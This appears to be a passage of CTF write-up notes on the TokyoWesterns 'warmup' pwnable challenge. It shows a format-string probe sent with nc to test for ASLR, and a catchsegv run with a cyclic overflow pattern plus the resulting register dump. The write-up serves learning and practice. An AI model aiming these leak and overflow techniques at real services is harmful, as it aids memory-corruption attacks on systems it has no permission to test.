### Notes

#### Remote ASLR Testing

After a bit of trial and error with `./warmup` I was able to craft a test that would return a value that was 16 bytes greater than `rsp`.  If ASLR is enabled the value will always be different, if disabled, the same.

Testing if the challenge service was using ASLR:

```
python2.7 -c 'print " "*258 + "%47$lx "' | nc nothing.chal.ctf.westerns.tokyo 10001
```

Cleaned up output:

```
7ffdfe4ee0e0
7ffdc94b04f0
7ffefc0cfe90
7ffd967adfa0
```

Yep, ASLR.

I wasted a lot of time trying to capture this value and setting the return pointer back to `gets` so that I could do a 2nd attack.  However `gets` never paused to allow input.  Complex stdin work required I guess.

#### Get register values from segfault:

This was helpful early on to get some understanding about some things.  However useless when testing the first basic exploit.  The exploit worked in GDB, failed without GDB, passed with `catchsegv`!  So no easy button to find the offset or delta from GDB.

```
cat p2k | catchsegv ./warmup
```

Output:

```

Hello CTF Players!
This is a warmup challenge for pwnable.
We provide some hints for beginners spawning a shell to get the flag.

1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflow.
2. NX-bit is disabled. You can run your shellcode easily.
3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.

If you get stuck, we recommend you to search about ROP and x64-shellcode.
Please pwn me :)
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZAEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZALBALCALDALEALFALGALHALIALJALKALLALMALNALOALPALQALRALSALTALUALVALWALXALYALZAMBAMCAMDAMEAMFAMGAMHAMIAMJAMKAMLAMMAMNAMOAMPAMQAMRAMSAMTAMUAMVAMWAMXAMYAMZANBANCANDANEANFANGANHANIANJANKANLANMANNANOANPANQANRANSANTANUANVANWANXANYANZAOBAOCAODAOEAOFAOGAOHAOIAOJAOKAOLAOMAONAOOAOPAOQAORAOSAOTAOUAOVAOWAOXAOYAOZAPBAPCAPDAPEAPFAPGAPHAPIAPJAPKAPLAPMAPNAPOAPPAPQAPRAPSAPTAPUAPVAPWAPXAPYAPZAQBAQCAQDAQEAQFAQGAQHAQIAQJAQKAQLAQMAQNAQOAQPAQQAQRAQSAQTAQUAQVAQWAQXAQYAQZARBARCARDAREARFARGARHARIARJARKARLARMARNAROARPARQARRARSARTARUARVARWARXARYARZASBASCASDASEASFASGASHASIASJASKASLASMASNASOASPASQASRASSASTASUASVASWASXASYASZATBATCATDATEATFATGATHATIATJATKATLATMATNATOATPATQATRATSATTATUATVATWATXATYATZAUBAUCAUDAUEAUFAUGAUHAUIAUJAUKAULAUMAUNAUOAUPAUQAURAUSAUTAUUAUVAUWAUXAUYAUZAVBAVCAVDAVEAVFAVGAVHAVIAVJAVKAVLAVMAVNAVOAVPAVQAVRAVSAVTAVUAVVAVWAVXAVYAVZAWBAWCAWDAWEAWFAWGAWHAWIAWJAWKAWLAWMAWNAWOAWPAWQAWRAWSAWTAWUAWVAWWAWXAWYAWZAXBAXCAXDAXEAXFAXGAXHAXIAXJAXKAXLAXMAXNAXOAXPAXQAXRAXSAXTAXUAXVAXWAXXAXYAXZAYBAYCAYDAYEAYFAYGAYHAYIAYJAYKAYLAYMAYNAYOAYPAYQAYRAYSAYTAYUAYVAYWAYXAYYAYZAZBAZCAZDAZEAZFAZGAZHAZIAZJAZKAZLAZMAZNAZOAZPAZQAZRAZSAZTAZUAZVAZWAZXAZYAZZBBBCBBDBBEBBFBBGBBHBBIBBJBBKBBLBBMBBNBBOBBPBBQBBRSegmentation fault
*** Segmentation fault
Register dump:

 RAX: 0000000000000000   RBX: 0000000000000000   RCX: 0000000000000000
 RDX: 00007ffff7bcc8c0   RSI: 00007fffffffbdc0   RDI: 0000000000000001
 RBP: 44414d44414c4441   R8 : 00000000000007d0   R9 : 00007ffff7fe8740
 R10: 00007fffffffc590   R11: 0000000000000246   R12: 0000000000400590
 R13: 00007fffffffe640   R14: 0000000000000000   R15: 0000000000000000
 RSP: 00007fffffffe568

 RIP: 0000000000400709   EFLAGS: 00010202

 CS: 0033   FS: 0000   GS: 0000

 Trap: 0000000d   Error: 00000000   OldMask: 00000000   CR2: 00000000

 FPUCW: 0000037f   FPUSW: 00000000   TAG: 00000000
 RIP: 00000000   RDP: 00000000

 ST(0) 0000 0000000000000000   ST(1) 0000 0000000000000000
 ST(2) 0000 0000000000000000   ST(3) 0000 0000000000000000
 ST(4) 0000 0000000000000000   ST(5) 0000 0000000000000000
 ST(6) 0000 0000000000000000   ST(7) 0000 0000000000000000
 mxcsr: 1f80
 XMM0:  0000000000000000000000004f594149 XMM1:  0000000000000000000000004f594149
 XMM2:  0000000000000000000000004f594149 XMM3:  0000000000000000000000004f594149
 XMM4:  0000000000000000000000004f594149 XMM5:  0000000000000000000000004f594149
 XMM6:  0000000000000000000000004f594149 XMM7:  0000000000000000000000004f594149
 XMM8:  0000000000000000000000004f594149 XMM9:  0000000000000000000000004f594149
 XMM10: 0000000000000000000000004f594149 XMM11: 0000000000000000000000004f594149
 XMM12: 0000000000000000000000004f594149 XMM13: 0000000000000000000000004f594149
 XMM14: 0000000000000000000000004f594149 XMM15: 0000000000000000000000004f594149
```
